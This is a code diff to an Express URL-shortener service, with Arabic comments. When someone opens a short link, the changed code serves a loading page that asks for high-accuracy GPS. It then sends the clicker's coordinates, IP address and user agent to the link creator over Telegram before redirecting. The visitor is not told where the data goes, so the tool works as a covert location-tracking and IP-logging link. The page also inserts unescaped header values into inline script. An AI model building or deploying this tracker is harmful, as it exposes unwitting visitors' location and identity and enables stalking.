@@ -59,7 +59,7 @@ async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
 }
 
 app.post('/api/shorten', (req, res) => {
-  const { url } = req.body;  // ← لا نحفظ GPS هنا!
+  const { url } = req.body;
   if (!url) return res.status(400).json({ error: 'URL required' });
 
   const shortCode = generateShortCode();
@@ -73,29 +73,124 @@ app.post('/api/shorten', (req, res) => {
   res.json({ shortened: shortenedUrl, code: shortCode });
 });
 
+// صفحة الرابط المختصر بـ GPS
 app.get('/:code', (req, res) => {
   const { code } = req.params;
   if (!linkStorage[code]) return res.status(404).send('Not found');
 
-  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
-  const userAgent = req.get('user-agent');
   const originalUrl = linkStorage[code].original;
   
-  // ← الـ GPS هنا من الشخص الي فتح الرابط الآن، مو من صاحب الموقع
-  const gpsString = req.query.gps;
-  let gps = null;
-  
-  if (gpsString) {
-    try {
-      gps = JSON.parse(decodeURIComponent(gpsString));
-    } catch (e) {
-      console.log('GPS parse error');
+  // HTML صفحة بـ GPS
+  res.send(`
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>جاري الفتح...</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: #667eea;
+      font-family: 'Segoe UI', sans-serif;
+      color: white;
+      margin: 0;
     }
-  }
+    .container {
+      text-align: center;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+    .spinner {
+      border: 4px solid rgba(255,255,255,0.3);
+      border-top: 4px solid white;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .status {
+      font-size: 14px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>⏳ جاري تحديد الموقع...</h1>
+    <div class="spinner"></div>
+    <div class="status" id="status">يرجى السماح بالموقع</div>
+  </div>
 
-  linkStorage[code].clicks++;
-  sendToTelegram(ip, code, originalUrl, userAgent, gps);
-  res.redirect(originalUrl);
+  <script>
+    const code = '${code}';
+    const originalUrl = '${originalUrl.replace(/'/g, "\\'")}';
+    const ip = '${req.headers['x-forwarded-for'] || req.socket.remoteAddress}'.split(',')[0].trim();
+    const userAgent = '${req.get('user-agent')}';
+
+    function redirectWithGPS() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const gps = {
+              lat: position.coords.latitude,
+              lng: position.coords.longitude,
+              accuracy: position.coords.accuracy
+            };
+            
+            // Send to backend
+            fetch('${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/api/log-visit', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ code, gps, ip, userAgent })
+            }).catch(e => console.log(e));
+            
+            // Redirect
+            window.location.href = originalUrl;
+          },
+          (error) => {
+            console.log('GPS error, redirecting anyway');
+            window.location.href = originalUrl;
+          },
+          { 
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        window.location.href = originalUrl;
+      }
+    }
+
+    redirectWithGPS();
+  </script>
+</body>
+</html>
+  `);
+});
+
+// API لتسجيل الزيارة
+app.post('/api/log-visit', (req, res) => {
+  const { code, gps, ip, userAgent } = req.body;
+  
+  if (linkStorage[code]) {
+    linkStorage[code].clicks++;
+    const originalUrl = linkStorage[code].original;
+    sendToTelegram(ip, code, originalUrl, userAgent, gps);
+  }
+  
+  res.json({ ok: true });
 });
 
 const PORT = process.env.PORT || 3000;
